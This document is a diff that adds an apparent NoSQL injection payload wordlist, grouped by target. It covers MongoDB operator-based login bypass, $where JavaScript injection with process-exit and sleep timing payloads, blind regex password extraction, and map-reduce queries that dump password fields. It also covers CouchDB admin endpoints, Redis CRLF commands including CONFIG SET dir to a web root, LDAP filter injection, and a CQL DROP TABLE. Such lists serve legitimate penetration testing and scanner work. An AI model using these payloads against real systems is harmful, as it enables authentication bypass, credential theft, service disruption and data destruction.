@@ -1,0 +1,298 @@
+# ── MongoDB Authentication Bypass ──
+{"$gt": ""}
+{"$gt": 0}
+{"$ne": ""}
+{"$ne": 0}
+{"$ne": null}
+{"$ne": "invalid"}
+{"$gte": ""}
+{"$gte": 0}
+{"$lt": "~"}
+{"$lte": "~"}
+{"$exists": true}
+{"$exists": false}
+{"$nin": []}
+{"$in": [true, false, null, "", 0]}
+{"$not": {"$eq": "invalid"}}
+
+# ── MongoDB Operator Injection (Query Params) ──
+[$gt]=
+[$gt]=0
+[$ne]=
+[$ne]=0
+[$ne]=null
+[$ne]=invalid
+[$gte]=
+[$lt]=~
+[$exists]=true
+[$exists]=false
+[$regex]=.*
+[$regex]=^a
+[$regex]=^admin
+[$nin][]=
+[$in][]=true&[$in][]=false
+[$not][$eq]=invalid
+[$size]=0
+[$type]=2
+
+# ── MongoDB $regex Extraction ──
+{"$regex": ".*"}
+{"$regex": "^"}
+{"$regex": "^a"}
+{"$regex": "^b"}
+{"$regex": "^c"}
+{"$regex": "^admin"}
+{"$regex": "^pass"}
+{"$regex": "^root"}
+{"$regex": ".{0,}"}
+{"$regex": "(?i)admin"}
+[$regex]=.*
+[$regex]=^a
+[$regex]=^admin
+[$regex]=^pass
+[$regex]=^root
+
+# ── MongoDB $where JavaScript Injection ──
+{"$where": "1==1"}
+{"$where": "1==2"}
+{"$where": "return true"}
+{"$where": "return false"}
+{"$where": "this.password.match(/.*/)"}
+{"$where": "this.username == 'admin'"}
+{"$where": "function(){return true}"}
+{"$where": "function(){return(this.password.length>0)}"}
+{"$where": "function(){sleep(5000);return true}"}
+{"$where": "function(){return this.constructor.constructor('return process')().exit()}"}
+[$where]=1==1
+[$where]=return true
+[$where]=function(){return true}
+[$where]=this.password.match(/.*/)
+
+# ── MongoDB JavaScript Injection ──
+';return true;var a='
+';return(true);var a='
+";return true;var a="
+1;return true;
+0;return true;
+';sleep(5000);var a='
+';return this.password;var a='
+';return this.username=='admin';var a='
+1||1==1
+1 || 1==1
+true||true
+'||'1'=='1
+'||''=='
+
+# ── MongoDB Map-Reduce Injection ──
+function(){emit(this._id,this.password)}
+function(){return db.users.find().toArray()}
+function(){return db.getCollectionNames()}
+function(){return tojson(db.adminCommand({listDatabases:1}))}
+
+# ── MongoDB JSON Body Injection ──
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"username": "admin", "password": {"$gt": ""}}
+{"username": "admin", "password": {"$ne": ""}}
+{"username": "admin", "password": {"$regex": ".*"}}
+{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$gt": ""}}
+{"username": {"$exists": true}, "password": {"$exists": true}}
+{"$or": [{"username": "admin"}, {"username": "root"}], "password": {"$gt": ""}}
+
+# ── CouchDB Injection ──
+{"selector": {"_id": {"$gt": null}}}
+{"selector": {"password": {"$gt": null}}}
+{"selector": {"$or": [{"_id": {"$gt": null}}]}}
+_all_docs
+_all_docs?include_docs=true
+_design/
+_changes
+_config
+_users/_all_docs
+_utils
+
+# ── Redis Injection ──
+\r\nSET injected true\r\n
+\r\nKEYS *\r\n
+\r\nINFO\r\n
+\r\nCONFIG GET *\r\n
+\r\nCONFIG SET dir /var/www/html\r\n
+\r\nDEBUG SLEEP 5\r\n
+%0d%0aSET%20injected%20true%0d%0a
+%0d%0aKEYS%20*%0d%0a
+
+# ── LDAP Injection ──
+*
+*()|&'
+*)(objectClass=*)
+*)(%26
+*()|%26'
+admin)(&)
+admin)(|(password=*))
+)(cn=*))(|(cn=*
+*)(uid=*))(|(uid=*
+)(|(password=*
+
+# ── Cassandra/CQL Injection ──
+' OR '1'='1
+'; DROP TABLE users; --
+' UNION SELECT * FROM system.local; --
+'; SELECT * FROM system_schema.tables; --
+
+# ── Elasticsearch Injection ──
+{"query": {"match_all": {}}}
+{"size": 10000, "query": {"match_all": {}}}
+{"query": {"wildcard": {"password": "*"}}}
+_search?q=*:*
+_search?q=password:*
+_cat/indices
+_cluster/health
+_mapping
+_all/_search?q=*
+
+# ── GraphQL NoSQL Patterns ──
+{"query": "{ __schema { types { name } } }"}
+{"query": "{ __type(name: \"User\") { fields { name } } }"}
+{"query": "mutation { login(username: \"admin\", password: {\"$ne\": \"\"}) { token } }"}
+
+# ── URL Parameter Pollution ──
+username=admin&password[$gt]=
+username=admin&password[$ne]=
+username[$gt]=&password[$gt]=
+username[$ne]=&password[$ne]=
+username[$regex]=.*&password[$regex]=.*
+username=admin&password[$exists]=true
+login=admin&password[$gt]=&login[$gt]=
+
+# ── Extended MongoDB Operators ───────────────────────────────────
+{"$not": {"$gt": ""}}
+{"$not": {"$ne": ""}}
+{"$nor": [{"username": "invalid"}]}
+{"$and": [{"$gt": ""}, {"$lt": "~"}]}
+{"$or": [{"admin": true}]}
+{"$or": [{"$gt": ""}, {"$ne": ""}]}
+{"$type": 2}
+{"$type": "string"}
+{"$size": 0}
+{"$all": [""]}
+{"$elemMatch": {"$gt": ""}}
+{"$mod": [1, 0]}
+
+# ── JavaScript Injection ($where) ────────────────────────────────
+[$where]=function(){return true}
+[$where]=1
+[$where]=this.password.match(/.*/)
+[$where]=return true
+[$where]=function(){return this.username=='admin'}
+[$where]=sleep(5000)
+[$where]=this.constructor.constructor('return process')().exit()
+{"$where": "function(){return true}"}
+{"$where": "this.password.match(/.*/)"}
+{"$where": "sleep(5000)"}
+{"$where": "return true"}
+{"$where": "1==1"}
+{"$where": "function(){sleep(5000);return true}"}
+
+# ── CouchDB Payloads ────────────────────────────────────────────
+_all_docs
+_all_docs?include_docs=true
+_design/
+_changes
+_changes?include_docs=true
+_config
+_users/_all_docs
+_utils
+
+# ── Blind Data Extraction ───────────────────────────────────────
+[$regex]=^a
+[$regex]=^b
+[$regex]=^c
+[$regex]=^admin
+[$regex]=^root
+[$regex]=^pass
+[$regex]=^.{1}$
+[$regex]=^.{2}$
+[$regex]=^.{3}$
+[$regex]=^.{4}$
+[$regex]=^.{5}$
+[$regex]=^.{6}$
+[$regex]=^.{7}$
+[$regex]=^.{8}$
+[$regex]=^.{10,}$
+[$regex]=^.{20,}$
+{"$regex": "^a"}
+{"$regex": "^b"}
+{"$regex": "^c"}
+{"$regex": "^.{1}$"}
+{"$regex": "^.{5,}$"}
+{"$regex": "^admin"}
+
+# ── Auth Bypass Extended ─────────────────────────────────────────
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
+{"username": "admin", "password": {"$gt": ""}}
+{"username": "admin", "password": {"$ne": ""}}
+{"username": "admin", "password": {"$regex": ".*"}}
+{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$gt": ""}}
+{"username": {"$regex": "^admin"}, "password": {"$gt": ""}}
+{"username": {"$exists": true}, "password": {"$exists": true}}
+
+# ── Aggregation Pipeline Injection ───────────────────────────────
+[{"$match": {"$gt": ""}}]
+[{"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "data"}}]
+[{"$group": {"_id": "$password"}}]
+
+# ── URL-encoded Operators ────────────────────────────────────────
+[$gt]=&[$lt]=~
+[$ne]=&[$ne]=invalid
+[$in][]=admin&[$in][]=root
+[$or][0][$gt]=&[$or][1][$gt]=
+[$not][$ne]=valid
+
+# ── MongoDB $where with Timing ───────────────────────────────────
+[$where]=function(){var d=new Date();var c=new Date();while(c-d<5000)c=new Date();return true}
+{"$where": "function(){var d=new Date();var c=new Date();while(c-d<5000)c=new Date();return true}"}
+[$where]=function(){if(this.username=='admin'){sleep(5000);return true}return false}
+{"$where": "function(){if(this.username=='admin'){sleep(5000);return true}return false}"}
+
+# ── MongoDB $expr ────────────────────────────────────────────────
+{"$expr": {"$eq": [1, 1]}}
+{"$expr": {"$gt": ["$password", ""]}}
+{"$expr": {"$function": {"body": "function(){return true}", "args": [], "lang": "js"}}}
+
+# ── Object Injection ────────────────────────────────────────────
+username[$ne]=&password[$ne]=
+username=admin&password[$gt]=
+username[$gt]=&password[$gt]=
+username[$exists]=true&password[$exists]=true
+username[$regex]=.*&password[$regex]=.*
+username=admin&password[$regex]=^a
+username=admin&password[$regex]=^b
+username=admin&password[$regex]=^c
+username=admin&password[$regex]=^1
+username=admin&password[$regex]=^2
+username=admin&password[$ne]=invalid
+login[$gt]=&pass[$gt]=
+
+# ── Array Injection ──────────────────────────────────────────────
+username[$in][0]=admin&username[$in][1]=root
+password[$in][0]=password&password[$in][1]=admin
+role[$in][0]=admin&role[$in][1]=superadmin
+id[$nin][0]=1
+status[$nin][0]=deleted
+
+# ── MongoDB JSON Deep Nesting ────────────────────────────────────
+{"username": {"$gt": ""}, "password": {"$gt": ""}, "role": {"$ne": "banned"}}
+{"$or": [{"username": "admin"}, {"username": "root"}], "password": {"$gt": ""}}
+{"$and": [{"username": {"$ne": ""}}, {"password": {"$gt": ""}}]}
+{"$or": [{"$and": [{"username": "admin"}, {"password": {"$gt": ""}}]}, {"$and": [{"username": "root"}, {"password": {"$gt": ""}}]}]}
+
+# ── NoSQL in Headers/Cookies ─────────────────────────────────────
+{"$gt": ""} (in cookie value)
+{"$ne": ""} (in X-Auth-Token)
+{"$regex": ".*"} (in Authorization)
+
+# ── MongoDB Map-Reduce ───────────────────────────────────────────
+{"$group": {"_id": null, "total": {"$sum": 1}}}
+{"mapReduce": "users", "map": "function(){emit(this.password,1)}", "reduce": "function(k,v){return 1}", "out": "inline"}
